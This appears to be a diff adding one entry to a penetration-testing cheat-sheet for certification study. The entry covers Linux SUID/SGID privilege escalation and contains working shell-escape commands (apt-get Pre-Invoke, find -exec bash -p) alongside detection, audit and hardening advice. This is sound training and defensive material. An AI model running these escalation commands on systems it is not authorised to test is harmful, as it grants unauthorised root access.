@@ -1,0 +1,107 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "find"
+  ],
+  "tags": [
+    "suid",
+    "sgid",
+    "enumeration"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - SUID/SGID & Capabilities",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "GTFOBins apt-get shell escape via a SUID/sudo entry",
+      "command": "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
+    },
+    {
+      "label": "SUID find abuse \u2014 -exec bash -p drops euid=root shell (-p preserves SUID effective uid)",
+      "command": "find /home/<user>/Desktop -exec \"/usr/bin/bash\" -p \\;\n# bash-5.0# id -> uid=1000(joe) gid=1000(joe) euid=0(root)"
+    },
+    {
+      "label": "Confirm a binary is SUID root before trying to abuse it",
+      "command": "ls -asl /usr/bin/find\n# 64 -rwsr-xr-x 1 root root 63736 ...  <- 's' in owner execute = SUID"
+    },
+    {
+      "label": "OSCP Ch17 \u2014 find all SUID binaries from root (Ch17 pattern)",
+      "command": "find / -perm -u=s -type f 2>/dev/null"
+    }
+  ],
+  "notes": "SUID root binaries run as root regardless of who launches them - match each against GTFOBins for a shell escape. -perm -4000 is SUID, -6000 catches SGID too. Also covered in: OSCP PEN-200 Chapter 17 (Linux Privilege Escalation).",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/"
+    },
+    {
+      "title": "Special permissions (setuid/setgid/sticky)",
+      "url": "https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Linux Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ref-capabilities",
+      "note": "Also enumerate file capabilities, not just SUID.",
+      "rel": "next"
+    },
+    {
+      "id": "nfs-no-root-squash",
+      "note": "Plant your own SUID binary over a no_root_squash NFS share.",
+      "rel": "alternative"
+    }
+  ],
+  "id": "find-suid-sgid",
+  "name": "SUID/SGID - Enumerate and Abuse",
+  "command": "find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null",
+  "description": "Find root-owned SUID/SGID binaries, then check GTFOBins for an escalation technique (e.g. apt-get's Pre-Invoke shell escape).",
+  "variations": [
+    {
+      "label": "SUID (-4000)",
+      "command": "find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null"
+    },
+    {
+      "label": "SGID (-6000)",
+      "command": "find / -uid 0 -perm -6000 -type f 2>/dev/null\nfind / -user root -perm -6000 -exec ls -ldb {} \\; 2>/dev/null"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1548.001"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "SUID (setuid) binaries run with the file owner's privileges (usually root) regardless of who executes them. Many legitimate SUID binaries have known exploitation techniques documented in GTFOBins. Custom SUID binaries may have vulnerabilities. SGID binaries run with group privileges and can expose group-accessible resources.",
+    "prerequisites": "Shell access. find command available. SUID binaries present that have exploitable characteristics per GTFOBins or known CVEs.",
+    "impact": "Root privilege escalation via exploitable SUID binary (shell escapes, command injection, path abuse). Identifies the attack surface for further targeted exploitation.",
+    "detection": "find command with -perm /4000 or -perm -4000 executed by non-root. SIEM: mass filesystem traversal for SUID files. Auditd: find -user root -perm -4000 by low-privileged user.",
+    "artifacts": "Auditd: find with SUID permission flags by non-root | Process log: enumeration of SUID binaries",
+    "prevention": "Regularly audit SUID/SGID binaries: find / -perm /4000 -o -perm /2000. Remove SUID bit from all binaries where not operationally required. Keep SUID binaries patched. Use nosuid mount option on non-system partitions. Cross-reference SUID binaries against GTFOBins.",
+    "misconfiguration": "Unnecessary SUID bits set on GTFOBins-listed binaries (vim, python, nmap, less, awk). Custom application binaries with SUID bit and vulnerabilities. SUID bit not audited regularly.",
+    "vulnerable_config": "# Unnecessary SUID on dangerous binaries\nfind / -user root -perm -4000 2>/dev/null\n# -rwsr-xr-x 1 root root /usr/bin/vim.basic\n# -rwsr-xr-x 1 root root /usr/bin/python3.8\n# -rwsr-xr-x 1 root root /usr/bin/find",
+    "secure_config": "# Remove unnecessary SUID bits\nchmod u-s /usr/bin/vim.basic\nchmod u-s /usr/bin/python3.8\n\n# Audit SUID regularly\nfind / -perm /4000 -type f 2>/dev/null > /root/suid_audit.txt\ndiff /root/suid_audit.txt /root/suid_baseline.txt\n\n# Mount user directories with nosuid\n/home /dev/sda2 ext4 defaults,nosuid,noexec 0 2",
+    "sources": [
+      "HTB M25",
+      "MITRE T1548.001"
+    ]
+  }
+}
